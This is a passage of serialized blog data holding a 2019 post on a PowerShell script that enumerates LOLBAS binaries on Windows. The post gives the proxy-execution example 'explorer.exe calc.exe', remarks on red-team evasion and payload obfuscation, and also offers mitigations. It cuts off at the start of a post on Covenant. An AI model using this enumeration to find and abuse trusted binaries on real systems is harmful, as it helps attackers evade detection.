1306w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/1fd0c/Treasure.jpg 3508w","srcWebp":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/0acdf/Treasure.webp","srcSetWebp":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/ac59e/Treasure.webp 163w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/7660b/Treasure.webp 327w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/0acdf/Treasure.webp 653w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/75470/Treasure.webp 980w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/68d47/Treasure.webp 1306w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/e7d05/Treasure.webp 3508w","sizes":"(max-width: 653px) 100vw, 653px"},"narrow":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAOABQDASIAAhEBAxEB/8QAFwABAQEBAAAAAAAAAAAAAAAAAwACBP/EABYBAQEBAAAAAAAAAAAAAAAAAAEDBP/aAAwDAQACEAMQAAABbfO2eoxw/wD/xAAZEAADAQEBAAAAAAAAAAAAAAAAAQIRAyH/2gAIAQEAAQUC54ipHJFeO8HTZ//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8BP//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8BP//EABcQAQADAAAAAAAAAAAAAAAAABAAETH/2gAIAQEABj8CluH/xAAXEAADAQAAAAAAAAAAAAAAAAAAAREh/9oACAEBAAE/IZBDYS3mEIhFgaU//9oADAMBAAIAAwAAABC0L//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8QP//EABURAQEAAAAAAAAAAAAAAAAAAAEQ/9oACAECAQE/EBAn/8QAGhABAQEBAQEBAAAAAAAAAAAAAREAMSFBcf/aAAgBAQABPxA8jZVW6Jp70c5V+MNlJA1hLw+7iG//2Q==","aspectRatio":1.4615384615384615,"src":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/eaa58/Treasure.jpg","srcSet":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/5a3ee/Treasure.jpg 114w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/41f8f/Treasure.jpg 229w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/eaa58/Treasure.jpg 457w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/c309b/Treasure.jpg 686w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/e3008/Treasure.jpg 914w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/1fd0c/Treasure.jpg 3508w","srcWebp":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/15384/Treasure.webp","srcSetWebp":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/31fce/Treasure.webp 114w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/e3e25/Treasure.webp 229w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/15384/Treasure.webp 457w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/0258d/Treasure.webp 686w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/64ea2/Treasure.webp 914w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/e7d05/Treasure.webp 3508w","sizes":"(max-width: 457px) 100vw, 457px"},"seo":{"src":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/0ff54/Treasure.jpg"}}},{"id":"32c98cab-0f66-51d2-9c73-c188b1e2bd8d","slug":"/The-Hunt-for-LOLBAS","secret":false,"title":"The Hunt for LOLBAS","author":"NotoriousRebel","date":"July 13th, 2019","dateForSEO":"2019-07-13T00:00:00.000Z","timeToRead":2,"excerpt":"Using Powershell to Hunt for LOLBAS","canonical_url":null,"subscription":true,"body":"function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"The Hunt for LOLBAS\",\n  \"author\": \"NotoriousRebel\",\n  \"date\": \"2019-07-13T00:00:00.000Z\",\n  \"hero\": \"./images/hunt_lolbas_logo.png\",\n  \"excerpt\": \"Using Powershell to Hunt for LOLBAS\"\n};\n\nvar makeShortcode = function makeShortcode(name) {\n  return function MDXDefaultShortcode(props) {\n    console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n    return mdx(\"div\", props);\n  };\n};\n\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, [\"components\"]);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"h1\", {\n    \"id\": \"hunting-for-lolbas\"\n  }, \"Hunting for LOLBAS\"), mdx(\"h3\", {\n    \"id\": \"introduction\"\n  }, \"Introduction\"), mdx(\"p\", null, \"Like many pentesters I am a big fan of the \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/LOLBAS-Project/LOLBAS\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"LOLBAS\"), \" project.\\nand even recently contributed to \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/LOLBAS-Project/LOLBAS/pull/40\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"it\"), \". Although, the project is\\nincredibly useful I couldn\\u2019t find a tool that automated the process\\nof finding them so I decided to make one.\\nThen again how useful are they for redteamers? The answer is incredibly useful.\\nA recent attack dubbed \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Astaroth\"), \" utilized LOLBAS for every step of the attack\\nafter initial compromise. \"), mdx(\"p\", null, \"With a goal in mind, I turned to Powershell.\"), mdx(\"h3\", {\n    \"id\": \"understanding-lolbas\"\n  }, \"Understanding LOLBAS\"), mdx(\"p\", null, \"Before automating the hunt for LOLBAS it\\u2019s important to understand\\nwhat they are. LOLBAS stands for living off the land binaries and scripts,\\na simple example, as leveraged in my last post is regsvr32. A seemingly\\ninconspicuous executable being used for code execution. Binaries and scripts\\nthat can be used in creative ways that benefit blueteam and redteam. Blueteam\\nas it can show possible attack vectors that should be monitored and understood.\\nRedteam as utilizing these possible attack vectors if present, may be less likely\\nnoticed and being run by a trusted source.\"), mdx(\"h3\", {\n    \"id\": \"python---powershell\"\n  }, \"Python -> Powershell\"), mdx(\"p\", null, \"With Linux being taken care of by \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://gtfobins.github.io/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"GTFOBins\"), \"\\nWindows was next.\\nOne of the biggest obstacles is that compared to GTFOBins,\\nLOLBAS is over quadruple the size. Using Python and Bash to quickly\\naccumulate the files and output the information into an easy way\\nto copy and paste is great. \"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"871px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"102.18140068886336%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAABJ0AAASdAHeZh94AAACLklEQVQ4y51U27KcIBAEFAQRUVBX18u6l1TykPz/53VG91ySVJ3K8Tx0MVDaMN0zw5qWIUaPy2XF7X7HOq1w2kHnGkIIMMaOwftnUFUe09zj+/oN1+GGNrSQaXqcsKqfgTE52lbC1wpOeViRHyfbUJYMSaLhnEZuGaxVyIxGIhIoSbHKwBnfkSYpMp3BZGaPZSp3WaSUMNogkxnYqWdQKkXlDVyaEUrUrkbIa9R1CVc4CCZ2KKVQOAdf+P3nV2JjDKqyQmEKsJZMKb3FeO7RSY/WNlBcEcH2oi+kXL9oqDKGrm8RYsBlvZCeHd1a07k6RhjC+6b0Fcahx0KkXekRQiB9k2OEW8p7wJ9rmjI0MUUXI0xhdrEDCyhF+fbNp1J+hRAc57HG/XFDp0/IhXlz+VBh85fbrS2wLCuapiGTerSshZb6QGFX/75QIBLZOI6YhhPGeYT3fu8aQXpu9cmPEHLOofVW6A49Ob25ba3dsREHFyAT+TFh0/x9sFX/OE6Ypgnr7YorIbekY0Iaik+k/Eq4ubvpKE2Gx487hr7HXM5Y44o5LrgGWt0MyywiiyhYASnkx4R5znC6UrfMC+ZhxMlRx7CMoKCZRkaxZHJvwfRl/U/KHOudRld/x8/yFx7uga7osHQLhuoMkxgI/on52LXvm35wNBNr9OeBnI40dehVSh7rlJ6mTVXn5F6FKB2iLiklmiBkjlT8a8Mhpbm3tdp9ueJ8mvZ2438U+xH8Bn1grZxfIP4rAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/cbef4edc206c107701526fd4c63ef865/e9904/automate.webp 871w\"],\n    \"sizes\": \"(max-width: 871px) 100vw, 871px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/cbef4edc206c107701526fd4c63ef865/62d82/automate.png 871w\"],\n    \"sizes\": \"(max-width: 871px) 100vw, 871px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/cbef4edc206c107701526fd4c63ef865/62d82/automate.png\",\n    \"alt\": \"Automate\",\n    \"title\": \"Automate\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"h5\", {\n    \"id\": \"automating-the-extraction-of-important-information-from-each-file\"\n  }, \"Automating the extraction of important information from each file\"), mdx(\"h3\", {\n    \"id\": \"checking-the-paths-in-powershell\"\n  }, \"Checking the Paths in Powershell\"), mdx(\"p\", null, \"Organizing the information in Powershell was simple,\\nusing a hash table. The key being the filepath mapped to\\nan array of the Binary or Script name and an example command\\nutilizing it. For example:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"'C:\\\\Windows\\\\explorer.exe' = 'Explorer.exe', 'explorer.exe calc.exe';\\n\")), mdx(\"p\", null, \"Path on the left, mapped to the name of the Binary or Script\\nand an example command utilizing it. \"), mdx(\"p\", null, \"After creating the hash table the rest is a piece of cake.\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"foreach($path in $dict.Keys){\\n   Try\\n    {         \\n      if(Test-Path -Path $path){\\n         $paths += $path\\n      }\\n    }\\n    Catch {\\n      Write-Host \\\"An error occurred:\\\"\\n      Write-Host $_\\n    }\\n }\\n\")), mdx(\"p\", null, \" Just iterate through the keys in the hash table and check\\nif the path exists if it does add it to an array. Then at the\\nend iterate through the array and pretty print it.\\nTbe script\\u2019s name was an obvious choice:\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/NotoriousRebel/Find-LOLBAS\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Find-LOLBAS\"), \".\"), mdx(\"h3\", {\n    \"id\": \"whats-next\"\n  }, \"What\\u2019s Next?\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Staying up to date with new LOLBAS additions\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Adding different ways to run the script such as through C# in Powershell\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Look into obfuscating payload with Crypt32.dll\"))), mdx(\"h3\", {\n    \"id\": \"mitigation\"\n  }, \"Mitigation\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Adhering to proper block rules such as\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Microsoft recommended block rules\"), \"\\nand utilizing things such as Applocker and Software Restriction Policies \")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Being cognisant of normal network traffic in and out of your system/s is also crucial\\nas becoming familiar with daily traffic can make it very easy to spot when something is\\nout of the ordinary\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Understanding the foundation of each LOLBAS is also important,\\nknowing how each one is meant to be used will make it easier to spot when it is\\nused for malicious purposes. \"))), mdx(\"p\", null, \"Overall awareness is necessary as well, knowing how a LOLBAS should be used\\nis key. For example, if you\\u2019ve never used regsvr32 before and find it calling out to the internet\\nthat should set off an alarm! \"), mdx(\"h3\", {\n    \"id\": \"acknowledgements\"\n  }, \"Acknowledgements\"), mdx(\"p\", null, \"This script wouldn\\u2019t have been possible without the amazing people\\nwho work on \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/LOLBAS-Project/LOLBAS\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"LOLBAS\"), \".\"), mdx(\"p\", null, \"Special thanks to \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://twitter.com/bohops\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"@Bohops\"), \"\\nfor inspiration and \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://twitter.com/Oddvarmoe\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"@Oddvarmoe\"), \"\\nfor the consistent work and maintenance on the\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/LOLBAS-Project/LOLBAS\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"LOLBAS\"), \" project.\"));\n}\n;\nMDXContent.isMDXComponent = true;","hero":{"full":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAALEgHS3X78AAADcElEQVQ4y41Ua0xURxQeaVqTNrFN2hhNTGr40VRaAsHYH9b6iCGFJU1DIaRJHxqDMeIjkkIfUB7amlat/UGgTVotDWBsQkt84CO4VndBZHmn5aFV1gZBVpBl2S4scmfm65m798KAJDrJl3Pu3HO+e+bOOR8DwNSSUjLyn9L8ZMJP5P9F1k8IEHoJlYR0wjMqlmyUzqGTLbICNhFa8PjVQ3jPypnJtx+iLH+flsAJBkEQpAVh7XEt7jCzllmpfUyye7Ugg6qWGtFC4BrxEYsjUiXnfINZEucKQlkhhJmoeCPckRV5jGyQEQRu+e8zrVSPXZmdp6CIreAZUmUNYUJa1gwi2zc5zZ9VZIlqo+rXcpGRkSGTHCmy+Mt86fMNmQRUaYTQtI9cjJxXyBbGhSjJyd6HF2MSjPTC72RO+R8yPu1jxMbH40Zv77x0gWCY42KPH9UdIzjXNap8Wds1anjuCYyHjRqWl/tJ0ysbk3DVN8Gb2zvoHNOYoty3swuR4kg2eUKhEPxj46Z/stUHtseNz894wXa7wHZckSzzT77yq07cDz7sZq/GvDZw4GQtHtD3v7kZkqXHytHTVI+2gIEVcW+gzXMdBUWFyNpDTfDwPxRf6AfLvIzPTnvxQ/0gXvi0EWyXS6Yev6G+N8yWvhw9VHWtEz3DAflLu1ee6Avgd7cHPvory9ash9tZh7yCAuzMykJwfAzv/twLttWJl764jtb+INZ+3wm27bI8eGlQEY6w1XGxLRlFRzFN/7/+Yq084u7GBL053tCJ6NfjEAyMITQxiYB/1Ozq5fmNcPz4N1y3Asg/ewcJh9slVSictycVYTc7UVlRtvrNt5BTdda4S8eua2qVJZc8iEtOxcH9RZGREZHLvPKPH4uzG0yiVV+3ILumD7mnvHJJ7jXDN2WGnFJtk9TgdiEpJYWvS/9QJmbulesd7+DooW9nZ5AL0w4EpvBb2zDKm3yo8BCaffJY4xDULVuh2+3GblFNdtVZZzgvnEf/v3fk7GTIOXaBHrTH7y71+vMmYTgc3qwFCauh5XyyBaZEWcN6t8WWLlNpiCDPmmdyhaGRLCQMuhqpVTYjDrqWkc3XFUeTKmGBa/v2Kp0jX5om2r6D0PUEAuslfGCT0UEWzWGdJ7RPE9IsuVfq3U9QndtOqCZ8RHjOPqbO8T+4HPK2YHw2SwAAAABJRU5ErkJggg==","aspectRatio":1,"src":"/static/e6f5e62a79cd7704687fe00638df8551/e0259/hunt_lolbas_logo.png","srcSet":"/static/e6f5e62a79cd7704687fe00638df8551/5b37e/hunt_lolbas_logo.png 236w,\n/static/e6f5e62a79cd7704687fe00638df8551/49058/hunt_lolbas_logo.png 472w,\n/static/e6f5e62a79cd7704687fe00638df8551/e0259/hunt_lolbas_logo.png 749w","srcWebp":"/static/e6f5e62a79cd7704687fe00638df8551/d8dc1/hunt_lolbas_logo.webp","srcSetWebp":"/static/e6f5e62a79cd7704687fe00638df8551/77392/hunt_lolbas_logo.webp 236w,\n/static/e6f5e62a79cd7704687fe00638df8551/1f177/hunt_lolbas_logo.webp 472w,\n/static/e6f5e62a79cd7704687fe00638df8551/d8dc1/hunt_lolbas_logo.webp 749w","sizes":"(max-width: 749px) 100vw, 749px"},"regular":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAALEgHS3X78AAADcElEQVQ4y41Ua0xURxQeaVqTNrFN2hhNTGr40VRaAsHYH9b6iCGFJU1DIaRJHxqDMeIjkkIfUB7amlat/UGgTVotDWBsQkt84CO4VndBZHmn5aFV1gZBVpBl2S4scmfm65m798KAJDrJl3Pu3HO+e+bOOR8DwNSSUjLyn9L8ZMJP5P9F1k8IEHoJlYR0wjMqlmyUzqGTLbICNhFa8PjVQ3jPypnJtx+iLH+flsAJBkEQpAVh7XEt7jCzllmpfUyye7Ugg6qWGtFC4BrxEYsjUiXnfINZEucKQlkhhJmoeCPckRV5jGyQEQRu+e8zrVSPXZmdp6CIreAZUmUNYUJa1gwi2zc5zZ9VZIlqo+rXcpGRkSGTHCmy+Mt86fMNmQRUaYTQtI9cjJxXyBbGhSjJyd6HF2MSjPTC72RO+R8yPu1jxMbH40Zv77x0gWCY42KPH9UdIzjXNap8Wds1anjuCYyHjRqWl/tJ0ysbk3DVN8Gb2zvoHNOYoty3swuR4kg2eUKhEPxj46Z/stUHtseNz894wXa7wHZckSzzT77yq07cDz7sZq/GvDZw4GQtHtD3v7kZkqXHytHTVI+2gIEVcW+gzXMdBUWFyNpDTfDwPxRf6AfLvIzPTnvxQ/0gXvi0EWyXS6Yev6G+N8yWvhw9VHWtEz3DAflLu1ee6Avgd7cHPvory9ash9tZh7yCAuzMykJwfAzv/twLttWJl764jtb+INZ+3wm27bI8eGlQEY6w1XGxLRlFRzFN/7/+Yq084u7GBL053tCJ6NfjEAyMITQxiYB/1Ozq5fmNcPz4N1y3Asg/ewcJh9slVSictycVYTc7UVlRtvrNt5BTdda4S8eua2qVJZc8iEtOxcH9RZGREZHLvPKPH4uzG0yiVV+3ILumD7mnvHJJ7jXDN2WGnFJtk9TgdiEpJYWvS/9QJmbulesd7+DooW9nZ5AL0w4EpvBb2zDKm3yo8BCaffJY4xDULVuh2+3GblFNdtVZZzgvnEf/v3fk7GTIOXaBHrTH7y71+vMmYTgc3qwFCauh5XyyBaZEWcN6t8WWLlNpiCDPmmdyhaGRLCQMuhqpVTYjDrqWkc3XFUeTKmGBa/v2Kp0jX5om2r6D0PUEAuslfGCT0UEWzWGdJ7RPE9IsuVfq3U9QndtOqCZ8RHjOPqbO8T+4HPK2YHw2SwAAAABJRU5ErkJggg==","aspectRatio":1,"src":"/static/e6f5e62a79cd7704687fe00638df8551/3ddd4/hunt_lolbas_logo.png","srcSet":"/static/e6f5e62a79cd7704687fe00638df8551/078a8/hunt_lolbas_logo.png 163w,\n/static/e6f5e62a79cd7704687fe00638df8551/e56da/hunt_lolbas_logo.png 327w,\n/static/e6f5e62a79cd7704687fe00638df8551/3ddd4/hunt_lolbas_logo.png 653w,\n/static/e6f5e62a79cd7704687fe00638df8551/e0259/hunt_lolbas_logo.png 749w","srcWebp":"/static/e6f5e62a79cd7704687fe00638df8551/0acdf/hunt_lolbas_logo.webp","srcSetWebp":"/static/e6f5e62a79cd7704687fe00638df8551/ac59e/hunt_lolbas_logo.webp 163w,\n/static/e6f5e62a79cd7704687fe00638df8551/7660b/hunt_lolbas_logo.webp 327w,\n/static/e6f5e62a79cd7704687fe00638df8551/0acdf/hunt_lolbas_logo.webp 653w,\n/static/e6f5e62a79cd7704687fe00638df8551/d8dc1/hunt_lolbas_logo.webp 749w","sizes":"(max-width: 653px) 100vw, 653px"},"narrow":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAALEgHS3X78AAADcElEQVQ4y41Ua0xURxQeaVqTNrFN2hhNTGr40VRaAsHYH9b6iCGFJU1DIaRJHxqDMeIjkkIfUB7amlat/UGgTVotDWBsQkt84CO4VndBZHmn5aFV1gZBVpBl2S4scmfm65m798KAJDrJl3Pu3HO+e+bOOR8DwNSSUjLyn9L8ZMJP5P9F1k8IEHoJlYR0wjMqlmyUzqGTLbICNhFa8PjVQ3jPypnJtx+iLH+flsAJBkEQpAVh7XEt7jCzllmpfUyye7Ugg6qWGtFC4BrxEYsjUiXnfINZEucKQlkhhJmoeCPckRV5jGyQEQRu+e8zrVSPXZmdp6CIreAZUmUNYUJa1gwi2zc5zZ9VZIlqo+rXcpGRkSGTHCmy+Mt86fMNmQRUaYTQtI9cjJxXyBbGhSjJyd6HF2MSjPTC72RO+R8yPu1jxMbH40Zv77x0gWCY42KPH9UdIzjXNap8Wds1anjuCYyHjRqWl/tJ0ysbk3DVN8Gb2zvoHNOYoty3swuR4kg2eUKhEPxj46Z/stUHtseNz894wXa7wHZckSzzT77yq07cDz7sZq/GvDZw4GQtHtD3v7kZkqXHytHTVI+2gIEVcW+gzXMdBUWFyNpDTfDwPxRf6AfLvIzPTnvxQ/0gXvi0EWyXS6Yev6G+N8yWvhw9VHWtEz3DAflLu1ee6Avgd7cHPvory9ash9tZh7yCAuzMykJwfAzv/twLttWJl764jtb+INZ+3wm27bI8eGlQEY6w1XGxLRlFRzFN/7/+Yq084u7GBL053tCJ6NfjEAyMITQxiYB/1Ozq5fmNcPz4N1y3Asg/ewcJh9slVSictycVYTc7UVlRtvrNt5BTdda4S8eua2qVJZc8iEtOxcH9RZGREZHLvPKPH4uzG0yiVV+3ILumD7mnvHJJ7jXDN2WGnFJtk9TgdiEpJYWvS/9QJmbulesd7+DooW9nZ5AL0w4EpvBb2zDKm3yo8BCaffJY4xDULVuh2+3GblFNdtVZZzgvnEf/v3fk7GTIOXaBHrTH7y71+vMmYTgc3qwFCauh5XyyBaZEWcN6t8WWLlNpiCDPmmdyhaGRLCQMuhqpVTYjDrqWkc3XFUeTKmGBa/v2Kp0jX5om2r6D0PUEAuslfGCT0UEWzWGdJ7RPE9IsuVfq3U9QndtOqCZ8RHjOPqbO8T+4HPK2YHw2SwAAAABJRU5ErkJggg==","aspectRatio":1,"src":"/static/e6f5e62a79cd7704687fe00638df8551/502b1/hunt_lolbas_logo.png","srcSet":"/static/e6f5e62a79cd7704687fe00638df8551/f2e6d/hunt_lolbas_logo.png 114w,\n/static/e6f5e62a79cd7704687fe00638df8551/4ddba/hunt_lolbas_logo.png 229w,\n/static/e6f5e62a79cd7704687fe00638df8551/502b1/hunt_lolbas_logo.png 457w,\n/static/e6f5e62a79cd7704687fe00638df8551/7ddc2/hunt_lolbas_logo.png 686w,\n/static/e6f5e62a79cd7704687fe00638df8551/e0259/hunt_lolbas_logo.png 749w","srcWebp":"/static/e6f5e62a79cd7704687fe00638df8551/15384/hunt_lolbas_logo.webp","srcSetWebp":"/static/e6f5e62a79cd7704687fe00638df8551/31fce/hunt_lolbas_logo.webp 114w,\n/static/e6f5e62a79cd7704687fe00638df8551/e3e25/hunt_lolbas_logo.webp 229w,\n/static/e6f5e62a79cd7704687fe00638df8551/15384/hunt_lolbas_logo.webp 457w,\n/static/e6f5e62a79cd7704687fe00638df8551/0258d/hunt_lolbas_logo.webp 686w,\n/static/e6f5e62a79cd7704687fe00638df8551/d8dc1/hunt_lolbas_logo.webp 749w","sizes":"(max-width: 457px) 100vw, 457px"},"seo":{"src":"/static/e6f5e62a79cd7704687fe00638df8551/e0259/hunt_lolbas_logo.png"}}},{"id":"ac530db8-6d83-518b-8169-4c44a58ce376","slug":"/Power-of-Covenant","secret":false,"title":"Power of Covenant","author":"NotoriousRebel","date":"May 1st, 2019","dateForSEO":"2019-05-01T00:00:00.000Z","timeToRead":4,"excerpt":"Deploying Covenant","canonical_url":null,"subscription":true,"body":"function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"Power of Covenant\",\n  \"author\": \"NotoriousRebel\",\n  \"date\": \"2019-05-01T00:00:00.000Z\",\n  \"hero\": \"./images/pwnboard_image.png\",\n  \"excerpt\": \"Deploying Covenant\"\n};\n\nvar makeShortcode = function makeShortcode(name) {\n  return function MDXDefaultShortcode(props) {\n    console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n    return mdx(\"div\", props);\n  };\n};\n\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, [\"components\"]);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"h1\", {\n    \"id\": \"using-covenant--red-teaming\"\n  }, \"Using Covenant & Red Teaming\"), mdx(\"h3\", {\n    \"id\": \"introduction\"\n  }, \"Introduction\"), mdx(\"p\", null, \"This past weekend, I had my first ever red teaming experience at\\nUniversity of Buffalo called \", mdx(\"a\", _extends({\n    parentName: 